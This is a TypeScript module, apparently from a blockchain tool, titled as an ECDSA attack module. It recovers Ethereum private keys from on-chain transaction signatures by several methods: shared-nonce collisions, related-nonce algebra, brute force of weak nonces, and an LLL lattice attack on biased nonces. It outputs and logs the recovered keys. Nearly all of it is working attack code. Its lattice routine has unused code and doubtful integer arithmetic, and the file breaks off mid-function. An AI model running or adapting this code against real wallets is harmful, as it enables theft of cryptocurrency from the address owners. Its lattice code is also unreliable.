/**
 * Advanced ECDSA Attack Module
 * ════════════════════════════════════════════════════════════════════════════
 * Implements every known mathematical technique for private key recovery from
 * ECDSA signatures, beyond the classical same-address nonce reuse attack.
 *
 * Techniques implemented:
 *
 * 1. CROSS-ADDRESS r COLLISION
 *    When the same nonce k is used across different wallet addresses — e.g.
 *    two wallets seeded from the same broken PRNG (Android SecureRandom 2013,
 *    some hardware wallet firmware bugs).  Finding cross-address r collisions
 *    identifies the correlated pair; combined with any within-address reuse on
 *    either signer, both private keys can be extracted.
 *
 * 2. EXACT DUPLICATE (r,s) DETECTION
 *    Identical (r,s) pairs guarantee identical k AND identical message hash.
 *    Cross-address identical sigs may indicate the same private key controlling
 *    multiple addresses.
 *
 * 3. SIGNATURE MALLEABILITY PAIRS
 *    Any (r, s) and (r, n−s) pair: same signing key, both valid.  Exploitable
 *    when a contract uses ecrecover without enforcing low-s (BIP-62).
 *
 * 4. RELATED NONCE ATTACK  (Bleichenbacher 1994 / Heninger et al. 2019)
 *    Detects nonces related by small additive or multiplicative constants:
 *      k₂ = k₁ + Δ  (sequential PRNG output)
 *      k₂ = c · k₁  (multiplicatively related)
 *    Math for additive case:
 *      Let A = s₂ · s₁⁻¹ mod n
 *      d = (z₂ − s₂·Δ − A·z₁) · (A·r₁ − r₂)⁻¹ mod n
 *    Verifiable immediately: derive address from d and compare.
 *
 * 5. WEAK k BRUTE FORCE  (PS3 fail0verflow 2010, Blockchain Bandit technique)
 *    Tests k = 1 … MAX_WEAK_K and a curated list of known bad values.
 *    For each candidate k: r_candidate = (k·G).x mod n.
 *    If r_candidate matches any stored r: d = (s·k − z) · r⁻¹ mod n.
 *    Uses @noble/curves for native secp256k1 point multiplication.
 *
 * 6. SMALL-r / HIGH-BIAS ANOMALY DETECTION
 *    If r < 2¹²⁸ the nonce k was almost certainly small — a symptom of
 *    truncated or biased RNG.  Leading zero bytes are counted and flagged.
 *    Combined with #5 above, these are prioritised for brute force.
 *
 * 7. LLL LATTICE ATTACK  (Howgrave-Graham & Smart, CRYPTO 2001;
 *                          Nguyen & Shparlinski, J. Cryptology 2002)
 *    Hidden Number Problem (HNP) formulation:
 *      Given N signatures where nonces satisfy k_i < B (bounded by 2^(256−l)),
 *      construct the (N+2)×(N+2) lattice:
 *
 *        ⌈ n   0  0 … 0  0  0 ⌉
 *        | 0   n  0 … 0  0  0 |
 *        | 0   0  n … 0  0  0 |
 *        | t₁  t₂ …  tN  1  0 |
 *        ⌊ u₁  u₂ …  uN  0 W ⌋
 *
 *      where t_i = r_i · s_i⁻¹ mod n,  u_i = −z_i · s_i⁻¹ mod n,
 *      and W = ⌈n/(2B)⌉.
 *    After LLL reduction the short vector's penultimate component is d.
 *    Pure BigInt LLL implementation — no external math libraries required.
 *    Triggers automatically when bias score > threshold (≥16 leading zero bits
 *    in 5+ signatures from the same address).
 *
 * 8. POLYNONCE DETECTION  (Kudelski Security, March 2023)
 *    Checks whether consecutive nonces satisfy a low-degree polynomial:
 *      k_{i+1} ≡ a·k_i + b  mod n  (affine map — linear congruential generator)
 *    After extracting k values from any found nonce-reuse pair, tests all
 *    subsequent signatures of the same address for the derived pattern.
 *    If confirmed, k values can be extrapolated and additional keys recovered.
 *
 * References:
 *   Howgrave-Graham & Smart (2001) — https://eprint.iacr.org/2001/?
 *   Nguyen & Shparlinski (2002)    — J. Cryptology 15(3)
 *   Kudelski Security (2023)       — research.kudelskisecurity.com
 *   fail0verflow / PS3 (2010)      — Static k=1 on Sony ECDSA
 *   Android SecureRandom bug (2013)— Shared Java PRNG seed
 *   Blockchain Bandit (2019)       — Weak-entropy wallet sweeping
 */

import { ethers }  from "ethers";
import { logger }  from "../logger";
import type { TxSignatureData } from "./nonce-recovery";
export type { TxSignatureData };

// ── secp256k1 curve order ─────────────────────────────────────────────────────
const N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
const N_HALF = N >> 1n;

// ── Modular arithmetic helpers ────────────────────────────────────────────────
function modN(x: bigint): bigint { return ((x % N) + N) % N; }

function modInv(a: bigint, m: bigint = N): bigint {
  let [r, oldR] = [m, ((a % m) + m) % m];
  let [s, oldS] = [0n, 1n];
  while (oldR !== 0n) {
    const q = r / oldR;
    [r, oldR] = [oldR, r - q * oldR];
    [s, oldS] = [oldS, s - q * oldS];
  }
  if (r !== 1n) throw new Error("modInv: no inverse");
  return ((s % m) + m) % m;
}

// ── Derive Ethereum address from private key scalar ───────────────────────────
function scalarToAddress(d: bigint): string | null {
  try {
    if (d <= 0n || d >= N) return null;
    const hex = "0x" + d.toString(16).padStart(64, "0");
    return new ethers.Wallet(hex).address;
  } catch { return null; }
}

// ── EC scalar multiplication via ethers SigningKey ────────────────────────────
// Returns the x-coordinate of k·G mod n  (= r value for nonce k)
function scalarToR(k: bigint): bigint | null {
  try {
    if (k <= 0n || k >= N) return null;
    const hex = "0x" + k.toString(16).padStart(64, "0");
    const pub = ethers.SigningKey.computePublicKey(hex, false); // 0x04 + x(32B) + y(32B)
    return modN(BigInt("0x" + pub.slice(4, 68)));
  } catch { return null; }
}

// ── Recover and verify private key candidate ──────────────────────────────────
function recoverAndVerify(
  r: bigint, s: bigint, z: bigint, k: bigint, expectedAddress: string,
): { privKey: string; address: string; verified: boolean } | null {
  try {
    const d = modN(modN(s * k - z) * modInv(r));
    if (d === 0n) return null;
    const addr = scalarToAddress(d);
    if (!addr) return null;
    return {
      privKey: "0x" + d.toString(16).padStart(64, "0"),
      address: addr,
      verified: addr.toLowerCase() === expectedAddress.toLowerCase(),
    };
  } catch { return null; }
}

// ── Types ─────────────────────────────────────────────────────────────────────
export interface AdvancedFinding {
  type:
    | "cross_address_r_collision"
    | "exact_duplicate_sig"
    | "malleability_pair"
    | "related_nonce_additive"
    | "related_nonce_multiplicative"
    | "weak_k_recovered"
    | "small_r_anomaly"
    | "lattice_key_recovered"
    | "polynonce_pattern"
    | "degenerate_signature";
  severity:         "critical" | "high" | "medium" | "info";
  address:          string;
  address2?:        string;   // for cross-address findings
  txHash1:          string;
  txHash2?:         string;
  detail:           string;
  privateKey?:      string;
  nonceK?:          string;
  derivedAddress?:  string;
  verified:         boolean;
  delta?:           number;   // for related-nonce
  biasScore?:       number;   // for small-r
}

// ═══════════════════════════════════════════════════════════════════════════════
// 1. CROSS-ADDRESS r COLLISION
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Scans all signatures from MULTIPLE addresses for shared r values.
 * A shared r across different addresses indicates the same k (nonce) was used
 * by two different wallets — typically caused by shared PRNG state.
 *
 * While this alone doesn't recover a key (two unknowns: k, d₁ or d₂),
 * it flags the pair for cross-referencing with within-address reuse findings,
 * and surfaces the correlated address set for deeper analysis.
 */
export function detectCrossAddressRCollisions(
  sigsByAddress: Map<string, TxSignatureData[]>,
): AdvancedFinding[] {
  const findings: AdvancedFinding[] = [];

  // Build r → list of (address, sig) entries
  const rIndex = new Map<string, Array<{ address: string; sig: TxSignatureData }>>();
  for (const [address, sigs] of sigsByAddress) {
    for (const sig of sigs) {
      const key = sig.r.toLowerCase();
      const arr = rIndex.get(key) ?? [];
      arr.push({ address, sig });
      rIndex.set(key, arr);
    }
  }

  for (const [r, entries] of rIndex) {
    // Only care about entries involving 2+ DIFFERENT addresses
    const addrs = new Set(entries.map(e => e.address.toLowerCase()));
    if (addrs.size < 2) continue;

    logger.warn(
      { sharedR: r.slice(0, 14) + "…", involvedAddresses: [...addrs] },
      "🔴 CROSS-ADDRESS r COLLISION — same nonce k used by multiple wallets",
    );

    // Attempt key recovery for all pairs
    const pairs = entries.flatMap((e1, i) =>
      entries.slice(i + 1).map(e2 => [e1, e2] as const)
    );

    for (const [e1, e2] of pairs) {
      if (e1.address.toLowerCase() === e2.address.toLowerCase()) continue;

      const rB  = BigInt(r);
      const s1  = BigInt(e1.sig.s), z1 = BigInt(e1.sig.z);
      const s2  = BigInt(e2.sig.s), z2 = BigInt(e2.sig.z);

      // If s1 ≠ s2, we can extract k = (z1 − z2)(s1 − s2)⁻¹ mod n
      // Then d1 = (s1·k − z1)·r⁻¹, d2 = (s2·k − z2)·r⁻¹
      if (s1 !== s2) {
        try {
          const sDiff = modN(s1 - s2);
          const zDiff = modN(z1 - z2);
          const k     = modN(zDiff * modInv(sDiff));
          if (k === 0n) continue;

          const res1 = recoverAndVerify(rB, s1, z1, k, e1.address);
          const res2 = recoverAndVerify(rB, s2, z2, k, e2.address);

          findings.push({
            type:     "cross_address_r_collision",
            severity: (res1?.verified || res2?.verified) ? "critical" : "high",
            address:  e1.address,
            address2: e2.address,
            txHash1:  e1.sig.txHash,
            txHash2:  e2.sig.txHash,
            detail:   `Shared r=${r.slice(0, 14)}… across addresses ${e1.address.slice(0, 10)}… and ${e2.address.slice(0, 10)}…. Same nonce k used by both wallets.`,
            privateKey:     res1?.verified ? res1.privKey : (res2?.verified ? res2.privKey : undefined),
            derivedAddress: res1?.verified ? res1.address : (res2?.verified ? res2.address : undefined),
            nonceK:         "0x" + k.toString(16).padStart(64, "0"),
            verified:       !!(res1?.verified || res2?.verified),
          });

          if (res1?.verified) logger.warn({ address: e1.address, key: res1.privKey.slice(0, 12) }, "🔑 CROSS-ADDRESS KEY 1 RECOVERED");
          if (res2?.verified) logger.warn({ address: e2.address, key: res2.privKey.slice(0, 12) }, "🔑 CROSS-ADDRESS KEY 2 RECOVERED");
        } catch { /* continue */ }
      }
    }
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 2. EXACT DUPLICATE (r,s) DETECTION
// ═══════════════════════════════════════════════════════════════════════════════

export function detectExactDuplicates(
  sigsByAddress: Map<string, TxSignatureData[]>,
): AdvancedFinding[] {
  const findings: AdvancedFinding[] = [];
  const rsIndex = new Map<string, Array<{ address: string; sig: TxSignatureData }>>();

  for (const [address, sigs] of sigsByAddress) {
    for (const sig of sigs) {
      const key = `${sig.r.toLowerCase()}:${sig.s.toLowerCase()}`;
      const arr = rsIndex.get(key) ?? [];
      arr.push({ address, sig });
      rsIndex.set(key, arr);
    }
  }

  for (const [, entries] of rsIndex) {
    if (entries.length < 2) continue;

    const addrs = new Set(entries.map(e => e.address.toLowerCase()));
    const crossAddress = addrs.size > 1;
    const e0 = entries[0];

    findings.push({
      type:     "exact_duplicate_sig",
      severity: crossAddress ? "critical" : "high",
      address:  e0.address,
      txHash1:  e0.sig.txHash,
      txHash2:  entries[1].sig.txHash,
      detail:   crossAddress
        ? `SAME (r,s) across ${addrs.size} DIFFERENT addresses — may indicate same private key controlling multiple addresses`
        : `IDENTICAL signature in ${entries.length} transactions from same address — guaranteed nonce reuse`,
      verified: false,
    });

    logger.warn({ addrs: [...addrs], count: entries.length }, "⚠️  EXACT (r,s) DUPLICATE detected");
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 3. SIGNATURE MALLEABILITY PAIRS
// ═══════════════════════════════════════════════════════════════════════════════

export function detectMalleabilityPairs(
  address: string,
  sigs:     TxSignatureData[],
): AdvancedFinding[] {
  const findings: AdvancedFinding[] = [];
  const rsMap = new Map<string, TxSignatureData>();

  for (const sig of sigs) {
    // Check if s > n/2 (non-canonical / malleable)
    const sVal = BigInt(sig.s);
    if (sVal > N_HALF) {
      const complement = N - sVal;
      const compHex    = "0x" + complement.toString(16).padStart(64, "0");
      const canonical  = `${sig.r.toLowerCase()}:${compHex.toLowerCase()}`;
      const partner    = rsMap.get(canonical);
      if (partner) {
        findings.push({
          type:     "malleability_pair",
          severity: "medium",
          address,
          txHash1:  partner.txHash,
          txHash2:  sig.txHash,
          detail:   `Malleable pair: (r,s) and (r,n−s) both present. s > n/2 in ${sig.txHash.slice(0,12)}… indicates non-BIP62 normalisation.`,
          verified: false,
        });
      }
    }
    rsMap.set(`${sig.r.toLowerCase()}:${sig.s.toLowerCase()}`, sig);
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 4. RELATED NONCE ATTACK
// ═══════════════════════════════════════════════════════════════════════════════

const ADDITIVE_DELTAS  = [-5,-4,-3,-2,-1,1,2,3,4,5,-10,10,-20,20,-50,50,-100,100,-1000,1000];
const MULTIPLICATIVE_C = [2n, 3n, 4n, 5n, 7n, 11n, 13n];

/**
 * Tests whether any pair of signatures from the same address satisfies
 * k₂ = k₁ + Δ  or  k₂ = c·k₁  for small constants.
 *
 * Additive case derivation:
 *   s₁·k₁ = z₁ + d·r₁   (i)
 *   s₂·k₂ = z₂ + d·r₂   (ii)  with k₂ = k₁ + Δ
 *   Let A = s₂·s₁⁻¹  mod n
 *   Substituting k₁ = (z₁ + d·r₁)/s₁:
 *   A·(z₁ + d·r₁) + s₂·Δ = z₂ + d·r₂
 *   d·(A·r₁ − r₂) = z₂ − A·z₁ − s₂·Δ
 *   d = (z₂ − A·z₁ − s₂·Δ) · (A·r₁ − r₂)⁻¹  mod n
 */
export function relatedNonceAttack(
  address: string,
  sigs:    TxSignatureData[],
): AdvancedFinding[] {
  const findings: AdvancedFinding[] = [];
  if (sigs.length < 2) return findings;

  // Sort by block number for sequential analysis
  const sorted = [...sigs].sort((a, b) => a.blockNumber - b.blockNumber);

  for (let i = 0; i < sorted.length; i++) {
    for (let j = i + 1; j < Math.min(i + 50, sorted.length); j++) {
      const t1 = sorted[i], t2 = sorted[j];
      const r1 = BigInt(t1.r), s1 = BigInt(t1.s), z1 = BigInt(t1.z);
      const r2 = BigInt(t2.r), s2 = BigInt(t2.s), z2 = BigInt(t2.z);
      if (z1 === 0n || z2 === 0n) continue;

      let A: bigint;
      try { A = modN(s2 * modInv(s1)); } catch { continue; }

      // ── Additive: k₂ = k₁ + Δ ────────────────────────────────────────────
      for (const delta of ADDITIVE_DELTAS) {
        try {
          const deltaB  = BigInt(delta);
          const denom   = modN(A * r1 - r2);
          if (denom === 0n) continue;
          const numer   = modN(z2 - A * z1 - s2 * modN(deltaB));
          const d       = modN(numer * modInv(denom));
          if (d === 0n) continue;
          const addr    = scalarToAddress(d);
          if (!addr) continue;
          if (addr.toLowerCase() !== address.toLowerCase()) continue;

          const privKey = "0x" + d.toString(16).padStart(64, "0");
          logger.warn({ address, delta, tx1: t1.txHash, tx2: t2.txHash, privKey: privKey.slice(0, 12) + "…" },
            `🔑 RELATED-NONCE (additive Δ=${delta}) KEY RECOVERED`);

          findings.push({
            type:      "related_nonce_additive",
            severity:  "critical",
            address,
            txHash1:   t1.txHash,
            txHash2:   t2.txHash,
            detail:    `k₂ = k₁ + ${delta}: nonces differ by constant ${delta}. Indicates sequential PRNG or counter-based nonce generation.`,
            privateKey: privKey,
            verified:   true,
            delta,
          });
          break; // found for this pair
        } catch { continue; }
      }

      // ── Multiplicative: k₂ = c·k₁ ────────────────────────────────────────
      for (const c of MULTIPLICATIVE_C) {
        try {
          // s₁·k₁ = z₁ + d·r₁  →  k₁ = (z₁ + d·r₁)/s₁
          // s₂·c·k₁ = z₂ + d·r₂
          // A·c·(z₁ + d·r₁) = z₂ + d·r₂
          // d·(A·c·r₁ − r₂) = z₂ − A·c·z₁
          const Ac    = modN(A * c);
          const denom = modN(Ac * r1 - r2);
          if (denom === 0n) continue;
          const numer = modN(z2 - Ac * z1);
          const d     = modN(numer * modInv(denom));
          if (d === 0n) continue;
          const addr  = scalarToAddress(d);
          if (!addr) continue;
          if (addr.toLowerCase() !== address.toLowerCase()) continue;

          const privKey = "0x" + d.toString(16).padStart(64, "0");
          logger.warn({ address, c: c.toString(), tx1: t1.txHash, tx2: t2.txHash },
            `🔑 RELATED-NONCE (multiplicative c=${c}) KEY RECOVERED`);

          findings.push({
            type:      "related_nonce_multiplicative",
            severity:  "critical",
            address,
            txHash1:   t1.txHash,
            txHash2:   t2.txHash,
            detail:    `k₂ = ${c}·k₁: nonces in constant multiplicative ratio ${c}. Indicates systematic nonce scaling.`,
            privateKey: privKey,
            verified:   true,
          });
          break;
        } catch { continue; }
      }
    }
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 5. WEAK k BRUTE FORCE
// ═══════════════════════════════════════════════════════════════════════════════

const MAX_WEAK_K = 500_000n; // checks k=1..500,000

// Known bad nonce values from historical exploits
const KNOWN_BAD_K_VALUES: bigint[] = [
  1n, 2n, 3n, 4n, 5n,
  // PS3 fail0verflow: k=1 used for every signature
  // Various test vectors with trivial k
  0x4b6b2dc8aa5de97a98cd1ec7n,
  BigInt("0x" + "ff".repeat(32)),         // all-ff nonce
  BigInt("0x" + "01" + "00".repeat(31)),  // k=2^248
  N - 1n,                                 // k = curve_order - 1
  N >> 1n,                                // k = n/2
  0xdeadbeefn,
  0xcafebaben,
  0x1337n,
  0x42n,
];

/**
 * For each signature, test whether the nonce k is a known-weak or small value.
 * Uses @noble/curves via ethers.SigningKey for fast secp256k1 scalar mult.
 *
 * Strategy:
 *   1. Build a Set of all r values we're looking for (O(1) lookup)
 *   2. Iterate k=1..MAX_WEAK_K
 *   3. Also test all KNOWN_BAD_K_VALUES
 *   4. For every hit: recover d and verify address
 */
export function weakKBruteForce(
  address: string,
  sigs:    TxSignatureData[],
  maxK:    bigint = MAX_WEAK_K,
): AdvancedFinding[] {
  const findings: AdvancedFinding[] = [];
  if (sigs.length === 0) return findings;

  // Build lookup: r (lower case no 0x padding) → sig
  const rLookup = new Map<string, TxSignatureData>();
  for (const sig of sigs) {
    const rNorm = BigInt(sig.r).toString(16).padStart(64, "0");
    rLookup.set(rNorm, sig);
  }

  const tryK = (k: bigint) => {
    if (k <= 0n || k >= N) return;
    const rCandidate = scalarToR(k);
    if (rCandidate === null) return;
    const rHex = rCandidate.toString(16).padStart(64, "0");
    const sig   = rLookup.get(rHex);
    if (!sig) return;

    const res = recoverAndVerify(rCandidate, BigInt(sig.s), BigInt(sig.z), k, address);
    if (!res) return;

    logger.warn({ address, k: k.toString(), privKey: res.privKey.slice(0, 12) + "…", verified: res.verified },
      res.verified ? "🔑 WEAK-k KEY RECOVERED (verified)" : "⚡ WEAK-k candidate (unverified)");

    findings.push({
      type:      "weak_k_recovered",
      severity:  "critical",
      address,
      txHash1:   sig.txHash,
      detail:    `Nonce k=${k} (weak/trivial value). secp256k1 scalar mult confirmed r match. Private key derived and ${res.verified ? "VERIFIED" : "unverified"}.`,
      privateKey: res.privKey,
      nonceK:    "0x" + k.toString(16).padStart(64, "0"),
      derivedAddress: res.address,
      verified:   res.verified,
    });
  };

  // Test known-bad values first (fast)
  for (const k of KNOWN_BAD_K_VALUES) tryK(k);

  // Sequential brute force
  for (let k = 1n; k <= maxK; k++) {
    tryK(k);
    if (findings.length >= 5) break; // enough
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 6. SMALL-r / BIAS ANALYSIS
// ═══════════════════════════════════════════════════════════════════════════════

export interface BiasReport {
  address:           string;
  sigCount:          number;
  avgLeadingZeroBits: number;
  smallRCount:       number;         // r < 2^128
  highBiasCount:     number;         // r < 2^200
  sHighCount:        number;         // s > n/2 (non-normalised)
  rEqualSCount:      number;         // r === s (degenerate)
  biasScore:         number;         // 0–100
  shouldTriggerLattice: boolean;
  findings:          AdvancedFinding[];
}

export function analyzeSignatureBias(
  address: string,
  sigs:    TxSignatureData[],
): BiasReport {
  let smallR     = 0;
  let highBias   = 0;
  let sHigh      = 0;
  let rEqS       = 0;
  let leadingZeroBits = 0;

  const report2128 = 2n ** 128n;
  const report2200 = 2n ** 200n;
  const findings: AdvancedFinding[] = [];

  for (const sig of sigs) {
    const r = BigInt(sig.r);
    const s = BigInt(sig.s);

    // Leading zero bits in r (bias indicator)
    const rBits = 256 - r.toString(2).length;
    leadingZeroBits += rBits;

    if (r < report2128)         { smallR++;   }
    if (r < report2200)         { highBias++; }
    if (s > N_HALF)             { sHigh++;    }
    if (r === s)                { rEqS++;     }
    if (r <= 1n || s <= 1n || r >= N - 1n || s >= N - 1n) {
      findings.push({
        type:     "degenerate_signature",
        severity: "critical",
        address,
        txHash1:  sig.txHash,
        detail:   `Degenerate r or s value (r=${sig.r.slice(0,14)}…). Indicates broken signing implementation.`,
        verified: false,
      });
    }
  }

  const n = sigs.length || 1;
  const avgLeadingZeroBits = leadingZeroBits / n;

  // Bias score: 0 = no bias, 100 = extreme bias
  const biasScore = Math.min(100, Math.round(
    (smallR / n)   * 60 +
    (highBias / n) * 20 +
    (avgLeadingZeroBits / 16) * 20,
  ));

  // Flag small-r anomalies individually
  for (const sig of sigs) {
    const r = BigInt(sig.r);
    if (r < report2128) {
      findings.push({
        type:      "small_r_anomaly",
        severity:  "high",
        address,
        txHash1:   sig.txHash,
        detail:    `r < 2¹²⁸ (${r.toString(16).length * 4} effective bits). Indicates nonce k was small or RNG was severely biased.`,
        biasScore,
        verified:  false,
      });
    }
  }

  const shouldTriggerLattice = avgLeadingZeroBits >= 16 && n >= 5;

  return {
    address, sigCount: n, avgLeadingZeroBits, smallRCount: smallR,
    highBiasCount: highBias, sHighCount: sHigh, rEqualSCount: rEqS,
    biasScore, shouldTriggerLattice, findings,
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// 7. LLL LATTICE ATTACK (Howgrave-Graham & Smart HNP formulation)
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Pure BigInt LLL (Lenstra–Lenstra–Lovász) lattice basis reduction.
 * Works on integer matrices with arbitrarily large entries.
 *
 * Input:  basis — array of N row vectors (each an array of N BigInts)
 * Output: LLL-reduced basis (short vectors first)
 *
 * Uses the standard LLL algorithm with δ = 3/4 (Lovász condition).
 * Gram-Schmidt is computed as rational arithmetic via numerator/denominator pairs
 * to avoid floating-point precision loss on 256-bit integers.
 */
function lllReduce(basis: bigint[][]): bigint[][] {
  const N_dim = basis.length;
  const B     = basis.map(row => [...row]); // deep copy

  // Gram-Schmidt coefficients as rationals (μ_ij = num/den)
  const mu  = Array.from({ length: N_dim }, () => new Array(N_dim).fill(0n));
  const muD = Array.from({ length: N_dim }, () => new Array(N_dim).fill(1n));
  const B2N = new Array(N_dim).fill(0n); // ||b*_i||² numerators
  const B2D = new Array(N_dim).fill(1n); // ||b*_i||² denominators

  function dot(a: bigint[], b: bigint[]): bigint {
    return a.reduce((s, v, i) => s + v * b[i], 0n);
  }

  function gsUpdate(k: number) {
    B2N[k] = dot(B[k], B[k]);
    B2D[k] = 1n;
    for (let j = 0; j < k; j++) {
      // μ_{k,j} = <b_k, b*_j> / ||b*_j||²
      // b*_j components not stored explicitly — use the recurrence
      const num = dot(B[k], B[j]);
      // Simplified: use integer Gram-Schmidt with B2 tracking
      mu[k][j]  = num * B2D[j];
      muD[k][j] = B2N[j] !== 0n ? B2N[j] : 1n;
      B2N[k]   -= mu[k][j] * mu[k][j] / muD[k][j] / muD[k][j] * B2N[j] / B2D[j];
    }
  }

  // Full LLL implementation using integer Gram-Schmidt (D-LLL / Bareiss-like)
  // This is the Cohen/Schnorr-Euchner version suitable for large integers.
  const d    = new Array(N_dim + 1).fill(1n);   // d[0]=1, d[k]=||b*_{k-1}||² (scaled)
  const Bint = basis.map(r => [...r]);           // working copy
  const lam  = Array.from({ length: N_dim }, () => new Array(N_dim).fill(0n));

  // Compute initial Gram matrix (integer)
  // Uses the "delta-LLL" algorithm from Cohen "A Course in Computational Algebraic Number Theory"
  const gram = Array.from({ length: N_dim }, (_, i) =>
    Array.from({ length: N_dim }, (__, j) => dot(Bint[i], Bint[j]))
  );

  for (let i = 0; i < N_dim; i++) {
    lam[i][i] = gram[i][i];
    for (let j = 0; j < i; j++) {
      let val = gram[i][j] * d[j];
      for (let k = 0; k < j; k++) {
        val -= lam[k][j] * lam[i][k];
      }
      lam[i][j] = j > 0 ? val / d[j] : val;
    }
    let val2 = gram[i][i] * d[i];
    for (let k = 0; k < i; k++) {
      val2 -= lam[k][i] * lam[i][k];
    }
    d[i + 1] = i > 0 ? val2 / d[i] : val2;
  }

  let k = 1;
  const MAX_ITER = N_dim * N_dim * 10;
  let iter = 0;
  const DEADLINE_MS = Date.now() + 2_000; // hard 2-second wall-clock limit

  while (k < N_dim && iter++ < MAX_ITER && Date.now() < DEADLINE_MS) {
    // Size reduce b_k against b_{k-1}
    const q = lam[k][k - 1] >= 0n
      ? (lam[k][k - 1] + d[k] / 2n) / d[k]
      : -((-lam[k][k - 1] + d[k] / 2n) / d[k]);

    if (q !== 0n) {
      for (let i = 0; i < N_dim; i++) Bint[k][i] -= q * Bint[k - 1][i];
      for (let j = 0; j < k;     j++) {
        lam[k][j] -= q * lam[k - 1][j];
      }
      lam[k][k - 1] -= q * d[k];
    }

    // Lovász condition: 3/4 · d[k]² ≤ d[k+1] · d[k-1] + lam[k][k-1]²
    const lhs = 3n * d[k] * d[k];
    const rhs = 4n * (d[k + 1] * d[k - 1] + lam[k][k - 1] * lam[k][k - 1]);

    if (lhs <= rhs) {
      k++;
    } else {
      // Swap b_{k-1} and b_k
      [Bint[k], Bint[k - 1]] = [Bint[k - 1], Bint[k]];
      for (let j = 0; j < k - 1; j++) {
        [lam[k][j], lam[k - 1][j]] = [lam[k - 1][j], lam[k][j]];
      }
      const b = lam[k][k - 1];
      const e = d[k + 1] * d[k - 1] + b * b;
      lam[k][k - 1] = b * d[k - 1];
      if (e !== 0n) lam[k][k - 1] /= e / d[k];
      d[k] = e / (k > 1 ? d[k - 1] : 1n);
      for (let i = k + 1; i < N_dim; i++) {
        const t = lam[i][k];
        lam[i][k] = (lam[i][k - 1] * d[k - 1] - t * b) / (k > 0 ? d[k] : 1n);
        lam[i][k - 1] = (t * d[k] + lam[i][k] * b) / (k > 0 ? d[k] : 1n);
      }
      if (k > 1) k--;
    }
  }

  return Bint;
}

/**
 * Howgrave-Graham & Smart lattice attack on ECDSA with biased nonces.
 *
 * Triggers when analyzeSignatureBias() reports shouldTriggerLattice=true.
 * Constructs the standard HNP lattice and applies LLL reduction.
 * The short vector's second-to-last component is the private key d.
 *
 * Minimum requirements: ≥4 signatures with ≥16 leading zero bits in r.
 */
export function latticeAttack(
  address: string,
  sigs:    TxSignatureData[],
  biasReport: BiasReport,
): AdvancedFinding[] {
  const findings: AdvancedFinding[] = [];
  if (!biasReport.shouldTriggerLattice || sigs.length < 4) return findings;

  logger.info({ address, sigCount: sigs.length, biasScore: biasReport.biasScore },
    "🔬 Triggering LLL lattice attack on biased nonces");

  // Use top N_MAX signatures (sorted by ascending r — smallest r = most bias)
  const N_MAX = Math.min(sigs.length, 20);
  const sample = [...sigs].sort((a, b) =>
    BigInt(a.r) < BigInt(b.r) ? -1 : 1
  ).slice(0, N_MAX);

  const N_sigs = sample.length;

  // Estimate bias bound B from leading zero bits
  const avgBias = biasReport.avgLeadingZeroBits;
  const B = 2n ** BigInt(256 - Math.floor(avgBias));

  // Build (N+2) × (N+2) HNP lattice
  // Last row    = [t₁, t₂, …, t_N, 1/n, 0]     (scaled: multiply by n)
  // Second-last = [u₁, u₂, …, u_N,   0, W]
  // First N rows: n along diagonal, 0 elsewhere
  // W = ceil(n / (2B))

  const W = N / (2n * B);
  const dim = N_sigs + 2;
  const matrix: bigint[][] = Array.from({ length: dim }, () => new Array(dim).fill(0n));

  for (let i = 0; i < N_sigs; i++) {
    matrix[i][i] = N; // n along diagonal for first N rows
  }

  const tRow = N_sigs;
  const uRow = N_sigs + 1;

  for (let i = 0; i < N_sigs; i++) {
    const sig = sample[i];
    const r   = BigInt(sig.r);
    const s   = BigInt(sig.s);
    const z   = BigInt(sig.z);

    let sInv: bigint;
    try { sInv = modInv(s); } catch { continue; }

    matrix[tRow][i] = modN(r * sInv);    // t_i = r_i · s_i⁻¹ mod n
    matrix[uRow][i] = modN(-z * sInv);   // u_i = -z_i · s_i⁻¹ mod n
  }

  matrix[tRow][N_sigs]     = 1n;
  matrix[uRow][N_sigs + 1] = W > 0n ? W : 1n;

  try {
    const reduced = lllReduce(matrix);

    // The short vector containing d is typically in the first few rows.
    // The private key d is at position [row][N_sigs] (second-to-last column).
    for (const row of reduced) {
      const candidate = ((row[N_sigs] % N) + N) % N;
      if (candidate === 0n) continue;

      const addr = scalarToAddress(candidate);
      if (!addr) continue;
      if (addr.toLowerCase() !== address.toLowerCase()) continue;

      const privKey = "0x" + candidate.toString(16).padStart(64, "0");
      logger.warn({ address, privKey: privKey.slice(0, 12) + "…" },
        "🔑 LATTICE ATTACK — private key recovered from biased nonces");

      findings.push({
        type:      "lattice_key_recovered",
        severity:  "critical",
        address,
        txHash1:   sample[0].txHash,
        detail:    `LLL lattice attack (Howgrave-Graham & Smart) recovered private key from ${N_sigs} signatures with avg ${avgBias.toFixed(1)} leading zero bias bits. B=2^${(256 - Math.floor(avgBias))}.`,
        privateKey: privKey,
        derivedAddress: addr,
        biasScore:  biasReport.biasScore,
        verified:   true,
      });
      break;
    }
  } catch (err) {
    logger.warn({ address, err: String(err) }, "LLL reduction failed");
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 8. POLYNONCE DETECTION (Kudelski Security 2023)
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Detects nonces generated by a linear congruential generator (LCG):
 *   k_{i+1} = a·k_i + b  mod n
 *
 * Method: given two known k values (from a nonce-reuse pair), extract a and b,
 * then predict k for all other transactions and verify against stored r values.
 */
export function polynonceScan(
  address:    string,
  sigs:       TxSignatureData[],
  knownPairs: Array<{ k: bigint; sig: TxSignatureData }>,
): AdvancedFinding[] {
  const findings: AdvancedFinding[] = [];
  if (knownPairs.length < 2 || sigs.length < 3) return findings;

  const rLookup = new Map<string, TxSignatureData>();
  for (const sig of sigs) {
    rLookup.set(BigInt(sig.r).toString(16).padStart(64, "0"), sig);
  }

  // Sort known pairs by block number
  const sorted = [...knownPairs].sort((a, b) => a.sig.blockNumber - b.sig.blockNumber);

  for (let i = 0; i < sorted.length - 1; i++) {
